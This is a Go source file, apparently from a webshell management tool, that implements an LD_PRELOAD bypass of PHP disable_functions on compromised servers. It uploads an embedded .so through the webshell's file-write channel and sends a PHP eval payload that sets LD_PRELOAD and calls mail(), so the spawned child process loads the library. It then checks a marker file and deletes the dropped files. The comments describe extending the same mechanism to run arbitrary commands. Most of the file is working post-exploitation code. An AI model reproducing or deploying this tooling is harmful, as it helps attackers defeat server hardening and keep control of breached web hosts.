// bypass.go 内建 disable_functions 绕过探测(LD_PRELOAD 路径,复盘 R1 修复 P0-1)。
//
// 原理(PHP eval 马 exec 系全禁、但 mail()+putenv() 可用时):
//
//	① WriteFile 把平台内嵌的预编译 freestanding x86_64 .so 投递到目标随机路径
//	   (.so 内嵌的路径槽在投递前改写为本次的探活标记文件路径);
//	② eval 马内 putenv("LD_PRELOAD=<so>") 后调 mail():mail() 派生的子进程
//	   (sendmail/sh)是动态链接 ELF,加载时动态链接器先执行 .so 构造器;
//	③ 构造器只做一件事:往标记文件写一个字节后 _exit(0)——最小可行「加载即
//	   证明」,不执行任何命令;eval 探针随后 file_exists 判定构造器是否真跑过。
//
// 本文件只做「探测与登记」:register_session 返回 disable_functions:true,
// bypass:"ld_preload"。session_exec 经绕过执行是后续项(留口:.so 已留在目标侧
// BypassLib 路径,执行载荷 .so 需另配,构造器入口协议沿用本文件的路径槽改写
// 机制——投递前把命令/参数路径写进槽位即可)。
//
// .so 产物由 session/ldpreloadgen(纯 Go 离线生成器,构建期外 `go run` 产出)
// 生成并随仓库提交,go:embed 进二进制;无任何外部工具链依赖。
package session

import (
	"bytes"
	"context"
	"crypto/rand"
	_ "embed"
	"encoding/hex"
	"net/url"
	"strings"
	"time"
)

// ldpreloadSO 是离线预编译的 freestanding x86_64 ELF 共享库:构造器纯 syscall
// (open/write/_exit),无 libc 依赖。布局与语义见 ldpreloadgen/main.go。
//
//go:embed ldpreload_x86_64.so
var ldpreloadSO []byte

const (
	// ldpreloadMagic 定位 .so 内的路径槽:magic 后紧跟 ldpreloadPathLen 字节的
	// C 字符串槽(构造器 open 的目标路径,投递前改写为探活标记文件路径)。
	ldpreloadMagic   = "ARTEXLDPATHv1\x00\x00\x00"
	ldpreloadPathLen = 128
	// bypassTriggerTimeout 是 mail() 触发探针的超时(sendmail 派生可能慢)。
	bypassTriggerTimeout = 30 * time.Second
)

// LDPreloadLib 返回内嵌 .so 的只读副本(测试与生成器校验用)。
func LDPreloadLib() []byte { return append([]byte(nil), ldpreloadSO...) }

// patchLDPreloadPath 把 .so 内的路径槽改写为 markPath(长度必须 < 槽长;改写后
// NUL 结尾、余量清零,不带任何残留)。
func patchLDPreloadPath(blob []byte, markPath string) ([]byte, error) {
	if markPath == "" || len(markPath) >= ldpreloadPathLen {
		return nil, opError("bypass", "探活标记路径非法(空或长度 ≥ %d 字节)", ldpreloadPathLen)
	}
	i := bytes.Index(blob, []byte(ldpreloadMagic))
	if i < 0 {
		return nil, opError("bypass", "内嵌 .so 缺路径占位符(构建产物损坏)")
	}
	out := append([]byte(nil), blob...)
	slot := out[i+len(ldpreloadMagic) : i+len(ldpreloadMagic)+ldpreloadPathLen]
	for j := range slot {
		slot[j] = 0
	}
	copy(slot, markPath)
	return out, nil
}

// randHex 生成 n 字节随机数的 hex(2n 字符,目标侧随机路径用)。
func randHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// probeBypass 执行 LD_PRELOAD 绕过探测并回填 info 与 s 的 bypass 字段。
// 只在 exec 系全禁且 mail()+putenv() 可用时调用。探测失败不拖垮登记:
// 原因如实写进 info.BypassNote(诚实语义,不伪造可用)。
func (s *HTTPShell) probeBypass(ctx context.Context, info *ProbeInfo) {
	soPath := defaultTmpPrefix + randHex(6) + ".so"
	markPath := defaultTmpPrefix + randHex(6) + ".mark"
	blob, err := patchLDPreloadPath(ldpreloadSO, markPath)
	if err != nil {
		info.BypassNote = err.Error()
		return
	}
	if err := s.WriteFile(ctx, soPath, blob); err != nil {
		info.BypassNote = "投递 .so 失败(文件写通道): " + err.Error()
		return
	}
	m := newSentinel()
	payload := `echo "` + m.start + `";` +
		`$so=base64_decode("` + b64e([]byte(soPath)) + `");` +
		`$mk=base64_decode("` + b64e([]byte(markPath)) + `");` +
		`if(!function_exists("putenv")||!function_exists("mail")){echo "NOBYPASS";}` +
		`else{@putenv("LD_PRELOAD=".$so);@mail("probe@localhost","p","p");` +
		`$ok=@file_exists($mk);@unlink($mk);echo ($ok?"BYPASSOK":"BYPASSFAIL");}` +
		`echo "\n` + m.end + `";`
	body, err := s.post(ctx, url.Values{s.password: {payload}}, bypassTriggerTimeout)
	if err != nil {
		info.BypassNote = "绕过触发探针传输失败: " + err.Error()
		s.cleanupFile(ctx, soPath)
		return
	}
	out, ok := m.extract(body)
	if !ok {
		info.BypassNote = "绕过触发探针哨兵缺失(疑似被 WAF 拦截/改写)。回显摘要: " + excerpt(body, 200)
		s.cleanupFile(ctx, soPath)
		return
	}
	switch {
	case strings.Contains(out, "BYPASSOK"):
		s.bypass, s.bypassLib = "ld_preload", soPath
		info.Bypass, info.BypassLib = "ld_preload", soPath
		info.BypassNote = "构造器探活确认:LD_PRELOAD 绕过可用(.so 已投递并留档;" +
			"session_exec 接通绕过执行是后续项)"
	default:
		// NOBYPASS(mail/putenv 目标侧实际不可用)与 BYPASSFAIL(构造器未执行:
		// mail 未派生子进程/加载器拒载/标记未落盘)统一如实上报,不留无用 .so。
		s.cleanupFile(ctx, soPath)
		if strings.Contains(out, "NOBYPASS") {
			info.BypassNote = "目标侧 mail()/putenv() 实际不可用(与枚举探针不一致,可能被运行时装订),绕过不可用"
		} else {
			info.BypassNote = "构造器未执行(mail() 未派生子进程/动态链接器拒载 .so),绕过不可用"
		}
	}
}

// cleanupFile 经 eval 马删除目标侧文件(best-effort,静默失败)。
func (s *HTTPShell) cleanupFile(ctx context.Context, path string) {
	m := newSentinel()
	payload := `echo "` + m.start + `";@unlink(base64_decode("` + b64e([]byte(path)) + `"));echo "\n` + m.end + `";`
	_, _ = s.post(ctx, url.Values{s.password: {payload}}, 0)
}
